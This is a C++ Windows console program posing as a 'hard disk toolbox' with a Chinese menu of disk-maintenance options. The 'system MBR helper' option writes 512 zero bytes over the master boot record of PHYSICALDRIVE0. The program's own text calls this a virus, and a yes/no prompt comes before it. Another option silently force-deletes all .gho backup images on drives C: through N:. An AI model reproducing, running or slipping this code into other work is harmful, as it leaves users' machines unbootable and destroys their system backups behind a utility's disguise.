#pragma warning( disable : 4996) 
#include <stdio.h> 
#include <stdlib.h> 
#include <windows.h> 
#include <math.h>
#include <tchar.h>
#include <iostream>
#include <winioctl.h>
using namespace std;
int main()
{
	printf("     硬盘小工具\n");
	printf("----------------------\n");
	printf("1.磁盘碎片整理\n");
	printf("2.检测Trim指令是否开启\n");
	printf("3.删除本机所有GHO文件\n");
	printf("4.系统MBR助手 \n");
	printf("5.清理垃圾 \n");
	printf("----------------------\n");
	int D1;
	printf("请输入你的选项后摁回车确认：");
	cin >> D1;
	if (D1 == 1)
	{
		system("start Diskclean.cmd");
	}
	else if (D1 == 2)
	{
		system("fsutil behavior QUERY DisableDeleteNotify");
		printf("返回值1表示系统已经将开启Trim，若为1则是未开启。\n");
		system("pause");
	}
	else if (D1 == 3)
	{
		system("for %%i in (c: d: e: f: g: h: i: j: k: l: m: n:) do del %%i\\*.gho /q /s /f /a");
	}
	else if (D1 == 4)
	{
		printf("---------------------------------------\n");
		printf("|         *********************        |\n");
		printf("|         *欢迎使用系统MBR助手*        |\n");
		printf("|         *********************        |\n");
		printf("|--------------------------------------|\n");
		{
			printf("病毒即将清空系统MBR");
			system("pause");
			int res = MessageBox(NULL, TEXT("病毒即将清空系统MBR"), TEXT("yaomianfa的提醒"), MB_YESNO);//老规矩 加保险
			if (res == IDYES)
			{
				FILE * fd = fopen("\\\\.\\PHYSICALDRIVE0", "rb+");/* 此句意思下面附上解释 */
				char buffer[512] = { 0 };//定义一个字符串并初始化清空，因为MBR主引导共有512字节 所以大小定义为512
				fseek(fd, 0, SEEK_SET); //因为MBR保存在磁盘的0柱面、0磁头、1扇区处，所以我们直接把文件指针偏移到文件开头 即MBR储存处
				fwrite(buffer, 512, 1, fd); //将系统MBR进行清空
				fclose(fd); //良好习惯 关闭打开的句柄
				return 0;
			}
			else return 0;
		}
	}
	else if (D1 == 5)
	{
		printf("正在清理...");
		system("cleanmgr");
		printf("是否进行深度垃圾清理？\n");
		printf("输入1进行清理，输入2不进行清理.\n");
		short q;
		cin >> q;
		if (q == 1)
		{
			system("start 工具箱调用.cmd");
		}
		else if (q == 2)
		{
			system("exit");
		}
	}
}

